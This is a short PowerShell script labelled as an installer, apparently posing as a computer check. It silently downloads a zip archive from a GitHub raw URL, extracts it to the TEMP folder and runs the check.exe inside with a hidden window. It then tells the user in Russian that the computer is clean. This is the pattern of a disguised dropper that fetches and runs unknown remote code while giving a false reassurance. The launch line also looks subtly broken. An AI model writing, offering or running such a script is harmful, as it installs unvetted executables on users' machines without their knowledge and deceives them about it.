# =============================================
# Installer
# =============================================

$Url = "https://raw.githubusercontent.com/v25888656-maker/check_install/main/check.zip"

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath  = "$env:TEMP\check_extracted"

Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing -TimeoutSec 30
Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force

$Exe = "$ExtractPath\check.exe"
if (Test-Path $Exe) {
    Start-Process $Exe.FullName -WindowStyle Hidden
}

Write-Host "Компьютер чист" -ForegroundColor Green
Start-Sleep -Seconds 1
exit
